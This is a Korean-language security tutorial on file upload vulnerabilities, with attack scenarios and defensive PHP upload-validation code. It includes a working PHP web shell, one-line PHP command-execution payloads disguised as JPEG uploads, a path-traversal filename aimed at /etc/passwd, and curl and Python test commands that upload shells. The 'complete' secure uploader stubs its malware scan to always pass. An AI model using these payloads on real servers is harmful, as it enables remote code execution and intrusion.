# File Upload 취약점 분석

## 📋 취약점 개요

**File Upload 취약점**은 웹 애플리케이션이 사용자로부터 파일 업로드를 받을 때 적절한 검증 없이 처리하여 발생하는 보안 취약점입니다. 공격자가 악성 파일을 업로드하여 서버에서 코드를 실행하거나 시스템을 손상시킬 수 있습니다.

### 🎯 공격 원리

1. **파일 타입 검증 우회**: 확장자나 MIME 타입 조작
2. **악성 코드 업로드**: 웹 셸이나 실행 가능한 스크립트 업로드
3. **경로 조작**: 의도하지 않은 위치에 파일 저장
4. **서버 측 실행**: 업로드된 악성 파일 실행

### 🔍 주요 위험성

- **CVSS 점수**: 9.1 (Critical)
- **원격 코드 실행**: 서버에서 임의 명령 실행
- **데이터 유출**: 민감한 정보 접근 및 탈취
- **시스템 손상**: 서버 리소스 및 파일 시스템 조작

## 🚨 공격 시나리오

### 시나리오 1: 웹 셸 업로드

```php
<?php
// 악성 PHP 웹셸 (shell.php)
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>
<form method="post">
    <input type="text" name="cmd" placeholder="명령어 입력">
    <input type="submit" value="실행">
</form>
```

### 시나리오 2: 이중 확장자 우회

```bash
# 파일명 조작을 통한 우회
malicious.php.jpg  # PHP로 실행될 수 있음
script.asp.png     # ASP로 실행될 수 있음
backdoor.jsp.gif   # JSP로 실행될 수 있음
```

### 시나리오 3: MIME 타입 우회

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="image.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary
```

### 시나리오 4: 경로 조작 (Path Traversal)

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
------WebKitFormBoundary
```

## 🛡️ 방어 방법

### 1. 파일 타입 검증

```php
<?php
function validateFileType($file) {
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $allowed_mime_types = [
        'image/jpeg',
        'image/png', 
        'image/gif',
        'application/pdf'
    ];
    
    // 확장자 검증
    $file_extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    if (!in_array($file_extension, $allowed_extensions)) {
        return false;
    }
    
    // MIME 타입 검증
    $mime_type = mime_content_type($file['tmp_name']);
    if (!in_array($mime_type, $allowed_mime_types)) {
        return false;
    }
    
    // 파일 시그니처 검증
    $file_content = file_get_contents($file['tmp_name'], false, null, 0, 10);
    if (!isValidFileSignature($file_content, $file_extension)) {
        return false;
    }
    
    return true;
}

function isValidFileSignature($content, $extension) {
    $signatures = [
        'jpg' => ["\xFF\xD8\xFF"],
        'png' => ["\x89PNG"],
        'gif' => ["GIF87a", "GIF89a"],
        'pdf' => ["%PDF-"]
    ];
    
    if (!isset($signatures[$extension])) {
        return false;
    }
    
    foreach ($signatures[$extension] as $signature) {
        if (substr($content, 0, strlen($signature)) === $signature) {
            return true;
        }
    }
    
    return false;
}
?>
```

### 2. 파일 크기 제한

```php
<?php
function validateFileSize($file, $max_size = 5242880) { // 5MB
    if ($file['size'] > $max_size) {
        return false;
    }
    return true;
}

// PHP 설정에서도 제한
ini_set('upload_max_filesize', '5M');
ini_set('post_max_size', '10M');
ini_set('max_file_uploads', '5');
?>
```

### 3. 안전한 파일명 생성

```php
<?php
function generateSafeFilename($original_name) {
    // 확장자 추출
    $extension = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));
    
    // UUID 생성하여 고유한 파일명 만들기
    $safe_name = uniqid('file_', true) . '.' . $extension;
    
    // 경로 조작 문자 제거
    $safe_name = preg_replace('/[^a-zA-Z0-9._-]/', '', $safe_name);
    
    return $safe_name;
}
?>
```

### 4. 업로드 디렉토리 보안

```php
<?php
// 웹 루트 외부에 업로드 디렉토리 설정
$upload_dir = '/var/uploads/'; // 웹 루트 외부

// .htaccess 파일로 실행 방지
function createSecureUploadDir($dir) {
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    
    // .htaccess 파일 생성
    $htaccess_content = "
<Files *>
    Order Deny,Allow
    Deny from all
</Files>

<FilesMatch '\.(jpg|jpeg|png|gif|pdf)$'>
    Order Allow,Deny
    Allow from all
</FilesMatch>

# PHP 실행 방지
php_flag engine off
";
    
    file_put_contents($dir . '.htaccess', $htaccess_content);
}
?>
```

### 5. 바이러스/악성코드 검사

```php
<?php
function scanForMalware($file_path) {
    // ClamAV를 사용한 바이러스 검사
    $output = [];
    $return_code = 0;
    
    exec("clamscan --no-summary " . escapeshellarg($file_path), $output, $return_code);
    
    // 0: 깨끗함, 1: 바이러스 발견, 2: 오류
    return $return_code === 0;
}
?>
```

## 🔧 완전한 보안 업로드 시스템

```php
<?php
class SecureFileUpload {
    private $upload_dir;
    private $allowed_types;
    private $max_size;
    
    public function __construct($upload_dir = '/var/uploads/') {
        $this->upload_dir = $upload_dir;
        $this->allowed_types = [
            'jpg' => ['image/jpeg', "\xFF\xD8\xFF"],
            'png' => ['image/png', "\x89PNG"],
            'pdf' => ['application/pdf', "%PDF-"]
        ];
        $this->max_size = 5 * 1024 * 1024; // 5MB
        
        $this->setupSecureDirectory();
    }
    
    public function uploadFile($file) {
        try {
            // 1. 기본 검증
            if (!$this->validateBasics($file)) {
                throw new Exception('기본 검증 실패');
            }
            
            // 2. 파일 타입 검증
            if (!$this->validateFileType($file)) {
                throw new Exception('허용되지 않은 파일 타입');
            }
            
            // 3. 파일 크기 검증
            if (!$this->validateFileSize($file)) {
                throw new Exception('파일 크기 초과');
            }
            
            // 4. 악성코드 검사
            if (!$this->scanForMalware($file['tmp_name'])) {
                throw new Exception('악성코드 검출');
            }
            
            // 5. 안전한 파일명 생성
            $safe_filename = $this->generateSafeFilename($file['name']);
            $destination = $this->upload_dir . $safe_filename;
            
            // 6. 파일 이동
            if (!move_uploaded_file($file['tmp_name'], $destination)) {
                throw new Exception('파일 저장 실패');
            }
            
            // 7. 파일 권한 설정
            chmod($destination, 0644);
            
            return [
                'success' => true,
                'filename' => $safe_filename,
                'path' => $destination
            ];
            
        } catch (Exception $e) {
            return [
                'success' => false,
                'error' => $e->getMessage()
            ];
        }
    }
    
    private function validateBasics($file) {
        return isset($file['tmp_name']) && 
               is_uploaded_file($file['tmp_name']) && 
               $file['error'] === UPLOAD_ERR_OK;
    }
    
    private function validateFileType($file) {
        $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
        
        if (!isset($this->allowed_types[$extension])) {
            return false;
        }
        
        $allowed_mime = $this->allowed_types[$extension][0];
        $signature = $this->allowed_types[$extension][1];
        
        // MIME 타입 검증
        $actual_mime = mime_content_type($file['tmp_name']);
        if ($actual_mime !== $allowed_mime) {
            return false;
        }
        
        // 파일 시그니처 검증
        $file_start = file_get_contents($file['tmp_name'], false, null, 0, strlen($signature));
        if (substr($file_start, 0, strlen($signature)) !== $signature) {
            return false;
        }
        
        return true;
    }
    
    private function validateFileSize($file) {
        return $file['size'] <= $this->max_size;
    }
    
    private function scanForMalware($file_path) {
        // 여기에 바이러스 검사 로직 추가
        return true; // 실제 구현에서는 ClamAV 등 사용
    }
    
    private function generateSafeFilename($original_name) {
        $extension = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));
        return hash('sha256', uniqid() . microtime()) . '.' . $extension;
    }
    
    private function setupSecureDirectory() {
        if (!is_dir($this->upload_dir)) {
            mkdir($this->upload_dir, 0755, true);
        }
        
        $htaccess = $this->upload_dir . '.htaccess';
        if (!file_exists($htaccess)) {
            file_put_contents($htaccess, "php_flag engine off\nOptions -ExecCGI");
        }
    }
}

// 사용 예제
$uploader = new SecureFileUpload();
$result = $uploader->uploadFile($_FILES['upload']);

if ($result['success']) {
    echo "파일 업로드 성공: " . $result['filename'];
} else {
    echo "업로드 실패: " . $result['error'];
}
?>
```

## 🧪 테스트 방법

### 1. 악성 파일 업로드 테스트

```bash
# 다양한 확장자로 테스트
curl -F "file=@shell.php" http://target.com/upload.php
curl -F "file=@shell.php.jpg" http://target.com/upload.php
curl -F "file=@shell.phtml" http://target.com/upload.php
```

### 2. MIME 타입 우회 테스트

```python
import requests

# MIME 타입을 조작하여 업로드 시도
files = {
    'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
}
response = requests.post('http://target.com/upload.php', files=files)
```

### 3. 파일 크기 제한 테스트

```bash
# 대용량 파일로 DoS 공격 시도
dd if=/dev/zero of=large_file.txt bs=1M count=1000
curl -F "file=@large_file.txt" http://target.com/upload.php
```

## 📚 참고 자료

### 공식 문서
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PHP File Uploads Security](https://www.php.net/manual/en/features.file-upload.php)

### 보안 가이드
- [PortSwigger File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [SANS File Upload Security](https://www.sans.org/white-papers/)

### 도구 및 리소스
- [Burp Suite File Upload Scanner](https://portswigger.net/burp)
- [OWASP ZAP File Upload Tests](https://owasp.org/www-project-zap/)

---

## 🎯 핵심 요약

1. **다중 검증**: 확장자, MIME 타입, 파일 시그니처 모두 검증
2. **안전한 저장**: 웹 루트 외부, 실행 권한 없는 디렉토리 사용
3. **파일명 보안**: 고유하고 안전한 파일명 생성
4. **지속적인 모니터링**: 업로드된 파일의 정기적인 검사

**⚠️ 주의**: File Upload 취약점은 높은 위험도를 가지므로 반드시 다층 보안 검증을 적용해야 합니다.